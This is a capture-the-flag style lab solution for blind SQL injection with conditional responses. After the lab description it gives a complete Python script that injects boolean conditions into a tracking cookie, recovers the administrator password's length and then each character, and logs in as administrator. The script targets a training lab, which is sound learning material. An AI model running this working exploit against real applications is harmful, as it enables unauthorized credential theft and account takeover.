# Blind SQL injection with conditional responses

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.
The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
To solve the lab, log in as the `administrator` user.

```python
import requests
import sys
import string
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: Blind SQL injection with conditional responses
# UPDATE THIS URL
BASE_URL = "https://0aa8002004037b5480f8db4600c900f6.web-security-academy.net/" 
LOGIN_URL = BASE_URL + "login"

def get_session(url):
    """
    Establishes a session and retrieves the critical TrackingId cookie.
    We need a persistent session because the server expects the same TrackingId 
    across requests for the 'Welcome back' logic to hold true.
    """
    session = requests.Session()
    response = session.get(url)
    if "TrackingId" in session.cookies:
        return session
    else:
        print("[-] Failed to get TrackingId.")
        sys.exit(1)

def check_boolean(url, session, sql_payload):
    """
    The Oracle: Asks the DB a True/False question.
    Returns True if the 'Welcome back' message appears.
    Returns False if it disappears.
    """
    TrackingID = session.cookies['TrackingId']
    
    # Inject the SQL payload into the existing TrackingId.
    # We use ' AND ... -- to ensure the query syntax remains valid.
    NewCookie = TrackingID + f"' AND {sql_payload} --"
    
    # Send the request with the specific injected cookie.
    # logic: if the SQL query returns TRUE, the app displays "Welcome back".
    response = session.get(url, cookies={'TrackingId': NewCookie})
    
    if "Welcome back" in response.text:
        return True
    else:
        return False

def get_password_length(url, session):
    """
    Finds the password length.
    """
    print("[*] Determining password length...")
    for i in range(1, 50):
        # We ask: Is the password length GREATER than i?
        payload = f"(SELECT LENGTH(password) FROM users WHERE username='administrator') > {i}"
        
        sys.stdout.write(f"\r[>] Checking Length: {i}")
        sys.stdout.flush()
        
        # We call the 'check_boolean' helper function to test our condition.
        # Logic: If 'Length > 20' is FALSE, then the length MUST be 20 (since >19 was True).
        if not check_boolean(url, session, payload):
            print(f"\n[+] Password Length Found: {i}")
            return i
    return None

def get_password(url, session, length):
    """
    Brute-forces the password character by character.
    """
    print(f"[*] Brute-forcing password...")
    password = ""
    # Charset: a-z and 0-9
    charset = string.ascii_lowercase + string.digits
    
    # Outer Loop: Move through the password one position at a time (1st letter, 2nd letter...)
    for i in range(1, length + 1):
        
        # Inner Loop: Try every possible character (a, b, c... 1, 2, 3...)
        for char in charset:
            # UX: Update the current line to show the password being built in real-time
            sys.stdout.write(f"\r[>] Extracted: {password}{char}")
            sys.stdout.flush()
            
            # Payload: Is the character at position {i} equal to '{char}'?
            payload = f"(SELECT SUBSTRING(password, {i}, 1) FROM users WHERE username='administrator') = '{char}'"
            
            # CALLING THE HELPER FUNCTION:
            # We pass the question (payload) to check_boolean.
            # It sends the request and returns True only if the DB says "Yes" (Welcome back).
            if check_boolean(url, session, payload):
                # If True, we found the correct letter!
                password += char
                break # Break the inner loop to move to the next character position (Outer Loop)
                
    sys.stdout.write(f"\r[+] Final Password Found: {password}\n")
    return password

def login(url, admin_pw):
    """
    Logs in as administrator to verify the exploit.
    """
    if not admin_pw: return

    print("[-] Logging in to verify credentials...")
    s = requests.Session()
    response = s.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Extract CSRF token required for login
    csrf_input = soup.find("input", {"name": "csrf"})
    if not csrf_input:
        print("[-] Error: CSRF token not found.")
        return
    token = csrf_input['value']
    
    login_data = {
        "username": "administrator",
        "password": admin_pw,
        "csrf": token
    }
    
    response = s.post(url, data=login_data)
    if "Log out" in response.text:
        print("[SUCCESS] LOGGED IN AS ADMINISTRATOR!")
    else:
        print("[-] Login failed.")

if __name__ == "__main__":
    session = get_session(BASE_URL)
    
    # 1. Get Length (Step 1 of the attack)
    pw_length = get_password_length(BASE_URL, session)
    
    # 2. Get Password (Step 2: Use the length to loop through characters)
    if pw_length:
        final_password = get_password(BASE_URL, session, pw_length)
        
        # 3. Login (Step 3: Verify success)
        login(LOGIN_URL, final_password)
```